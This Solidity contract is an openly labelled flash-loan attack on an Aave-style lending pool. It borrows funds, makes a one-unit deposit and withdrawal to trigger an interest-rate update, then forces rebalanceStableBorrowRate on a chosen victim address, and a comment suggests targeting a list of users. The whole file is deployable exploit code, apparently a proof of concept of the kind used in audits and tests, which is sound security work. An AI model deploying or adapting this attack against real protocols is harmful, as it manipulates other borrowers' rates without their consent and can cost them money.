// SPDX-License-Identifier: agpl-3.0
pragma solidity 0.6.12;

import {ILendingPool} from '../interfaces/ILendingPool.sol';
import {IFlashLoanReceiver} from '../flashloan/interfaces/IFlashLoanReceiver.sol';
import {IERC20} from '../dependencies/openzeppelin/contracts/IERC20.sol';

contract RebalanceFlashloanAttack is IFlashLoanReceiver {
  address private _lendingPool;
  address private _userToRebalance;

  function attackRebalanceFlashloan(
    address lendingPool,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address userToRebalance,
    bytes calldata params
  ) public {
    _lendingPool = lendingPool;
    _userToRebalance = userToRebalance; // Note alternative this could be done to a list of users

    ILendingPool(lendingPool).flashLoan(
      address(this),
      assets,
      amounts,
      modes,
      address(this),
      params,
      0
    );
  }


  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) override public returns (bool) {
    // `approve()` repay flashloan and deposit
    IERC20(assets[0]).approve(_lendingPool, amounts[0] + premiums[0] + 1);

    // `deposit()` so `updateInterestRates()` occurs
    ILendingPool(_lendingPool).deposit(assets[0], 1, address(this), 0);

    // `withdraw()` to make calculations easier
    ILendingPool(_lendingPool).withdraw(assets[0], 1, address(this));

    // `rebalanceStableBorrowRate()`
    ILendingPool(_lendingPool).rebalanceStableBorrowRate(assets[0], _userToRebalance);

    return true;
  }
}
